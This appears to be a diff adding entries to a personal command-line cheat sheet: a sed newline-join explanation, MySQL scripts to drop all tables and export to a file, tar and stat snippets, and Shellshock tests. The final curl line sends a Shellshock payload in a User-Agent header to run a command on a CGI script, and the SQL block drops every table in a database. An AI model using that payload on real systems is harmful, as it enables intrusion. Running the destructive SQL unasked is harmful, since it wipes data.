@@ -101,6 +101,12 @@ basename - strip directory and suffix from filenames
 dirname  - strip non-directory suffix from file name
 
 
+sed ':a;N;$!ba;s/\n/ /g'
+This will read the whole file in a loop, then replaces the newline(s) with a space.
+1. create a label via :a
+2. append the current and next line to the pattern space via N
+3. if we are before the last line, branch to the created label $!ba ($! means not to do it on the last line (as there should be one final newline)).
+4. finally the substitution replaces every newline with a space on the pattern space (which is the whole file).
  
  | tr '\n' ',' | sed 's/,*$//g'
  
@@ -1139,6 +1145,23 @@ SELECT type, COUNT(type) FROM table WHERE time > (NOW() - INTERVAL 40 MINUTE) GR
 SELECT GROUP_CONCAT(id SEPARATOR ',' ) FROM table;
 SELECT GROUP_CONCAT( CONCAT( id, ' ', name, ' ', city, ' ', state) SEPARATOR ',')  from table;
 
+--------------------drop all table----------------------------------------
+SET FOREIGN_KEY_CHECKS = 0; 
+SET @tables = NULL;
+SELECT GROUP_CONCAT(table_schema, '.', table_name) INTO @tables
+FROM information_schema.tables 
+WHERE table_schema = 'database_name'; -- specify DB name here.
+
+SET @tables = CONCAT('DROP TABLE ', @tables);
+PREPARE stmt FROM @tables;
+EXECUTE stmt;
+DEALLOCATE PREPARE stmt;
+SET FOREIGN_KEY_CHECKS = 1; 
+------------------------------------------------------------
+mysqldump --add-drop-table --no-data  database_name  | grep ^DROP | mysql database_name
+
+select * from table into outfile '/tmp/x.cvs' fields terminated by ',' enclosed by '"' lines terminated by '\n';
+
 
 smbclient //192.168.2.2/share -U root%password
 
@@ -1234,4 +1257,14 @@ echo "$myCode"
 eval "$myCode"
 
 
+while read i; do echo -e "Parameter : $i"; done < <(echo -e "a\nab\nc") 
+
+tar -c -f foo.tar -C /etc passwd hosts -C /lib libc.a
+
+file size
+stat -c %s FileName
+
+env x='() { :; }; echo What is Shellshock?' bash -c 'echo Should I worry?'
+env x='() { :; }; echo vulnerable' bash -c 'echo this is a test'
+curl -A "() { foo;};echo \"Content-type: text/plain\"; ping 192.168.2.172 &" http://192.168.2.180/cgi-bin/poc.cgi }"
 
